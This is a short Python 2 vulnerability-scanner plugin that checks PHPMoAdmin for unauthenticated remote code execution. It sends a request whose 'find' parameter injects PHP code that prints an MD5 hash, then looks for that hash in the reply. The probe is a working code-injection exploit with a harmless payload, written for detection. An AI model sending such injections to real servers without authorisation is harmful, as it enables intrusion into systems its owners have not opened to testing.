#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import * 

info = {
	'NAME':'PHPMoAdmin Unauthorized Remote Code Execution v2',
	'AUTHOR':'yangbh',
	'TIME':'20150314',
	'WEB':'https://gist.github.com/brandonprry/0ac151a8479b48a40099,https://twitter.com/BrandonPrry/status/572800017867517952',
	'DESCRIPTION':'PHPMoAdmin Unauthorized Remote Code Execution'
}
opts = [
	['url','http://testasp.vulnweb.com','target url'],
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'PhpMoAdmin':
			return True
	return False

def Audit(services):
	url = services['url'] + '/moadmin.php?db=xxx&action=listRows&collection=xxx&find=array2;'
	command = 'print(md5(3.14));exit'
	rqu = requests.post(url+command)
	# print rqu.text
	if rqu.status_code==200 and '4beed3b9c4a886067de0e3a094246f78' in rqu.text:
		# print rqu.text
		logger(rqu.text)
		security_hole(url)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://example.com','cms':'PhpMoAdmin'}
	pprint(Audit(services))